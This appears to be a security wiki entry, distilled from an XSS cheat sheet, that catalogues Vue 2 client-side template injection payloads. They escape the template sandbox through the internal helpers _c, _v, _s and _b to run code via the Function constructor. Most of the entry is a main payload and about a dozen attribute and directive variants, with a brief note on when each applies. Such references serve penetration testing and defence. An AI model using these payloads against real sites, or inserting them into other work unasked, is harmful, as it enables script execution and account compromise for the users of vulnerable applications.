---
title: Vue 2 Internal Helper Escape (_c / _v / _s / _b)
slug: vue2-helper-escape
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [payload, sink/dom-xss, sink/csti, sink/vue2]
inbound: []
---

# Vue 2 Internal Helper Escape (_c / _v / _s / _b)

## Payload

```html
{{_c.constructor('alert(1)')()}}
```

## Variants

```html
{{_v.constructor('alert(1)')()}}
{{_s.constructor('alert(1)')()}}
<x v-html=_c.constructor('alert(1)')()>
<x v-if=_c.constructor('alert(1)')()>
<p v-show="_c.constructor`alert(1)`()">
<x v-on:click='_b.constructor`alert(1)`()'>click</x>
<x v-bind:a='_b.constructor`alert(1)`()'>
<x @[_b.constructor`alert(1)`()]>
<x :[_b.constructor`alert(1)`()]>
<x @click='_b.constructor`alert(1)`()'>click</x>
<x #[_c.constructor`alert(1)`()]>
```

## Context

Applies when `constructor` access is blocked by the Vue 2 sandbox but internal render helpers `_c` (createElement), `_v` (createTextVNode), `_s` (toString), `_b` (bindProps) are still in scope. These functions are not objects of special concern to the sandbox but all have a `.constructor` property pointing to `Function`. Template literal tagged-function form (backticks) avoids parentheses. No user interaction needed except for `v-on:click` variants.

## Provenance

- Distilled from: `../../techniques/dom-xss/framework-vectors-vue.md`
- Original source: `../../sources/portswigger-xss-cheatsheet.md`

## Linked techniques

- [Vue.js Framework Vectors](../../techniques/dom-xss/framework-vectors-vue.md)
- [Client-Side Template Injection](../../techniques/dom-xss/client-side-template-injection.md)
